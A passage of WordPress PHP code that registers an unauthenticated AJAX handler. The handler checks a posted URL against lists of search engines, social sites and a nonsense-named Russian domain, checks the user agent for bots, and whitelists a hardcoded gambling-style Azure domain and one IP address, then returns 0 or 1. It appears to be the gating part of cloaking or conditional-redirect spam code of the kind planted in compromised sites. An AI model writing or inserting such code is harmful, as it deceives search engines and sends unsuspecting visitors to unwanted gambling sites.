"www.google.td",
 "123sdfsdfsdfsd.ru/r.html?r=", 
"123sdfsdfsdfsd.ru/r.html?r=",

		"duckduckgo.com","www.duckduckgo.com",
		"rambler.ru","www.rambler.ru","mail.ru","www.mail.ru",
		'www.bing.com','www.yahoo.com','bing.com','yahoo.com','facebook.com',
'twitter.com',
'vk.com',
'sape.ru',
'blogun.ru',
'forumok.com',
'www.facebook.com',
'www.twitter.com',
'www.vk.com',
'www.sape.ru',
'www.blogun.ru',
'www.forumok.com',
'twitter.com',
'www.twitter.com'
	);
	return array_search(parse_url($whatever)['host'],$findme);
}

add_action('wp_ajax_my_action', 'my_action_callback');
add_action('wp_ajax_nopriv_my_action', 'my_action_callback');
function my_action_callback() {
		$whatever = '';
		if(isset($_POST['whatever'])){
			$whatever = $_POST['whatever'];				
		}

		$actual_domain = [
			'slot-ok.azurewebsites.net'
		];
		$current_domain =  str_replace('www.', '', $_SERVER['HTTP_HOST']);
		$is_actual = in_array($current_domain, $actual_domain);
		if($is_actual) {

			$result = isBot($_SERVER['HTTP_USER_AGENT']);
			if($result===false){
				if(searchEngineDetect($whatever)!==false){
					$asdasd=true;
				}else{
					if($whatever=='')
						$asdasd=false;
					if(parse_url($whatever)['host']=='slot-ok.azurewebsites.net')
						$asdasd=true;
					if(isBots($_SERVER['HTTP_USER_AGENT'])!=false)
						$asdasd=true;
					if($_SERVER['REMOTE_ADDR']=='37.1.204.118')
						$asdasd=true;
				}
				if($asdasd==false){
					echo 0;
				} else {
					echo 1;
				}
			}else{
				echo 1;
			}
			
		}
	wp_die();
}



?>
